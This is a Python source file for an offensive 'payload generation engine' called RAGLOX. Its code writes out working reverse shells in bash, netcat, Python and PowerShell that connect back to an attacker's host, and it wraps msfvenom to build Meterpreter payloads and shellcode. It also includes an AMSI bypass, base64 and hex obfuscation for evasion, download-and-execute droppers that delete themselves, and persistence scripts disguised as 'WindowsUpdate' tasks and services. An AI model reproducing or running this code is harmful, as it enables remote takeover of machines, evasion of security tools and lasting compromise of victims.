"""
RAGLOX v3.0 - Payload Generation Engine
Enterprise-grade payload generation with evasion techniques.

Author: RAGLOX Team
Version: 3.0.0
"""

import asyncio
import logging
import base64
import random
import string
import hashlib
from typing import Optional, Dict, Any, List
from pathlib import Path
from jinja2 import Environment, FileSystemLoader, Template

logger = logging.getLogger("raglox.exploitation.payloads.generator")


class PayloadGenerator:
    """
    Enterprise Payload Generation Engine
    
    Features:
    - Template-based payload generation (Jinja2)
    - Multiple payload types (reverse shell, bind shell, meterpreter, etc.)
    - Evasion techniques (encoding, obfuscation, encryption)
    - AMSI/EDR bypass mechanisms
    - Custom payload generation
    - Payload staging
    """
    
    def __init__(self, templates_dir: Optional[str] = None):
        """
        Initialize Payload Generator
        
        Args:
            templates_dir: Directory containing payload templates
        """
        self.templates_dir = Path(templates_dir) if templates_dir else Path("data/payloads/templates")
        self.templates_dir.mkdir(parents=True, exist_ok=True)
        
        # Jinja2 environment
        self.jinja_env = Environment(
            loader=FileSystemLoader(str(self.templates_dir)),
            autoescape=False
        )
        
        # Payload statistics
        self._payloads_generated = 0
        self._payload_cache: Dict[str, str] = {}
        
        logger.info("PayloadGenerator initialized")
    
    async def generate_reverse_shell(
        self,
        target_os: str,
        lhost: str,
        lport: int,
        shell_type: str = "bash",
        evasion: bool = False
    ) -> Optional[str]:
        """
        Generate reverse shell payload
        
        Args:
            target_os: Target OS (linux, windows, macos)
            lhost: Attacker IP
            lport: Attacker port
            shell_type: Shell type (bash, powershell, python, etc.)
            evasion: Enable evasion techniques
        
        Returns:
            Payload code
        """
        logger.info(f"Generating reverse shell: {target_os}/{shell_type}")
        
        try:
            if target_os.lower() == "linux":
                if shell_type == "bash":
                    payload = self._generate_bash_reverse_shell(lhost, lport)
                elif shell_type == "python":
                    payload = self._generate_python_reverse_shell(lhost, lport)
                else:
                    payload = self._generate_bash_reverse_shell(lhost, lport)
            
            elif target_os.lower() == "windows":
                if shell_type == "powershell":
                    payload = self._generate_powershell_reverse_shell(lhost, lport)
                elif shell_type == "python":
                    payload = self._generate_python_reverse_shell(lhost, lport)
                else:
                    payload = self._generate_powershell_reverse_shell(lhost, lport)
            
            else:
                logger.error(f"Unsupported target OS: {target_os}")
                return None
            
            # Apply evasion techniques
            if evasion:
                payload = await self._apply_evasion(payload, target_os, shell_type)
            
            self._payloads_generated += 1
            return payload
            
        except Exception as e:
            logger.error(f"Failed to generate reverse shell: {str(e)}")
            return None
    
    def _generate_bash_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Bash reverse shell"""
        # Multiple variants for evasion
        variants = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            f"nc -e /bin/bash {lhost} {lport}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        ]
        return random.choice(variants)
    
    def _generate_python_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Python reverse shell"""
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".strip()
    
    def _generate_powershell_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell"""
        return f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
""".strip()
    
    async def generate_meterpreter_payload(
        self,
        target_os: str,
        architecture: str,
        lhost: str,
        lport: int,
        payload_type: str = "reverse_tcp",
        encoder: Optional[str] = None,
        iterations: int = 1
    ) -> Optional[bytes]:
        """
        Generate Meterpreter payload
        
        Args:
            target_os: Target OS (windows, linux, macos)
            architecture: Target architecture (x86, x64)
            lhost: Attacker IP
            lport: Attacker port
            payload_type: Payload type (reverse_tcp, reverse_https, bind_tcp)
            encoder: Encoder to use (x86/shikata_ga_nai, etc.)
            iterations: Encoding iterations
        
        Returns:
            Payload bytes
        """
        logger.info(f"Generating Meterpreter payload: {target_os}/{architecture}/{payload_type}")
        
        try:
            # Build msfvenom command
            payload_name = f"{target_os}/{architecture}/meterpreter/{payload_type}"
            
            cmd = [
                "msfvenom",
                "-p", payload_name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", "raw"
            ]
            
            if encoder:
                cmd.extend(["-e", encoder, "-i", str(iterations)])
            
            # Execute msfvenom
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"msfvenom failed: {stderr.decode()}")
                return None
            
            self._payloads_generated += 1
            return stdout
            
        except Exception as e:
            logger.error(f"Failed to generate Meterpreter payload: {str(e)}")
            return None
    
    async def generate_shellcode(
        self,
        target_os: str,
        architecture: str,
        shellcode_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Optional[bytes]:
        """
        Generate raw shellcode
        
        Args:
            target_os: Target OS
            architecture: Target architecture
            shellcode_type: Shellcode type (exec, adduser, etc.)
            parameters: Shellcode parameters
        
        Returns:
            Shellcode bytes
        """
        logger.info(f"Generating shellcode: {target_os}/{architecture}/{shellcode_type}")
        
        try:
            # Build msfvenom command
            payload_name = f"{target_os}/{architecture}/{shellcode_type}"
            
            cmd = ["msfvenom", "-p", payload_name]
            
            if parameters:
                for key, value in parameters.items():
                    cmd.append(f"{key}={value}")
            
            cmd.extend(["-f", "raw"])
            
            # Execute msfvenom
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Shellcode generation failed: {stderr.decode()}")
                return None
            
            return stdout
            
        except Exception as e:
            logger.error(f"Failed to generate shellcode: {str(e)}")
            return None
    
    async def _apply_evasion(
        self,
        payload: str,
        target_os: str,
        shell_type: str
    ) -> str:
        """
        Apply evasion techniques to payload
        
        Args:
            payload: Original payload
            target_os: Target OS
            shell_type: Shell type
        
        Returns:
            Obfuscated payload
        """
        logger.debug("Applying evasion techniques")
        
        if target_os.lower() == "windows" and shell_type == "powershell":
            # PowerShell obfuscation
            payload = self._obfuscate_powershell(payload)
            payload = self._amsi_bypass_powershell(payload)
        
        elif target_os.lower() == "linux" and shell_type == "bash":
            # Bash obfuscation
            payload = self._obfuscate_bash(payload)
        
        return payload
    
    def _obfuscate_powershell(self, payload: str) -> str:
        """Obfuscate PowerShell payload"""
        # Base64 encoding
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -enc {encoded}"
    
    def _amsi_bypass_powershell(self, payload: str) -> str:
        """Add AMSI bypass to PowerShell payload"""
        amsi_bypass = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
""".strip()
        
        return f"{amsi_bypass}\n{payload}"
    
    def _obfuscate_bash(self, payload: str) -> str:
        """Obfuscate Bash payload"""
        # Hex encoding
        hex_encoded = "".join(f"\\x{ord(c):02x}" for c in payload)
        return f"echo -e \"{hex_encoded}\" | bash"
    
    async def generate_dropper(
        self,
        target_os: str,
        payload_url: str,
        execution_method: str = "download_execute"
    ) -> Optional[str]:
        """
        Generate dropper script
        
        Args:
            target_os: Target OS
            payload_url: URL to download payload from
            execution_method: Execution method
        
        Returns:
            Dropper script
        """
        logger.info(f"Generating dropper: {target_os}/{execution_method}")
        
        try:
            if target_os.lower() == "linux":
                dropper = f"""
#!/bin/bash
wget -q {payload_url} -O /tmp/.payload
chmod +x /tmp/.payload
/tmp/.payload &
rm -f /tmp/.payload
""".strip()
            
            elif target_os.lower() == "windows":
                dropper = f"""
$url = "{payload_url}"
$output = "$env:TEMP\\payload.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item $output -Force
""".strip()
            
            else:
                return None
            
            return dropper
            
        except Exception as e:
            logger.error(f"Failed to generate dropper: {str(e)}")
            return None
    
    async def generate_persistence_payload(
        self,
        target_os: str,
        payload_path: str,
        persistence_method: str = "auto"
    ) -> Optional[str]:
        """
        Generate persistence payload
        
        Args:
            target_os: Target OS
            payload_path: Path to payload
            persistence_method: Persistence method (registry, scheduled_task, service, etc.)
        
        Returns:
            Persistence script
        """
        logger.info(f"Generating persistence: {target_os}/{persistence_method}")
        
        try:
            if target_os.lower() == "windows":
                if persistence_method == "registry" or persistence_method == "auto":
                    script = f"""
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$name = "WindowsUpdate"
Set-ItemProperty -Path $regPath -Name $name -Value "{payload_path}"
""".strip()
                
                elif persistence_method == "scheduled_task":
                    script = f"""
$action = New-ScheduledTaskAction -Execute "{payload_path}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest
""".strip()
                
                else:
                    return None
            
            elif target_os.lower() == "linux":
                if persistence_method == "cron" or persistence_method == "auto":
                    script = f"""
(crontab -l 2>/dev/null; echo "@reboot {payload_path}") | crontab -
""".strip()
                
                elif persistence_method == "systemd":
                    script = f"""
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart={payload_path}
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
systemctl start update.service
""".strip()
                
                else:
                    return None
            
            else:
                return None
            
            return script
            
        except Exception as e:
            logger.error(f"Failed to generate persistence: {str(e)}")
            return None
    
    async def generate_custom_payload(
        self,
        template_name: str,
        variables: Dict[str, Any]
    ) -> Optional[str]:
        """
        Generate custom payload from Jinja2 template
        
        Args:
            template_name: Template file name
            variables: Template variables
        
        Returns:
            Generated payload
        """
        logger.info(f"Generating custom payload from template: {template_name}")
        
        try:
            template = self.jinja_env.get_template(template_name)
            payload = template.render(**variables)
            
            self._payloads_generated += 1
            return payload
            
        except Exception as e:
            logger.error(f"Failed to generate custom payload: {str(e)}")
            return None
    
    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """
        Encode payload
        
        Args:
            payload: Original payload
            encoding: Encoding type (base64, hex, url)
        
        Returns:
            Encoded payload
        """
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == "hex":
            return payload.encode().hex()
        
        elif encoding == "url":
            from urllib.parse import quote
            return quote(payload)
        
        else:
            return payload
    
    def decode_payload(self, payload: str, encoding: str = "base64") -> str:
        """
        Decode payload
        
        Args:
            payload: Encoded payload
            encoding: Encoding type
        
        Returns:
            Decoded payload
        """
        if encoding == "base64":
            return base64.b64decode(payload.encode()).decode()
        
        elif encoding == "hex":
            return bytes.fromhex(payload).decode()
        
        elif encoding == "url":
            from urllib.parse import unquote
            return unquote(payload)
        
        else:
            return payload
    
    def generate_random_string(self, length: int = 8) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get generator statistics"""
        return {
            "payloads_generated": self._payloads_generated,
            "cached_payloads": len(self._payload_cache)
        }
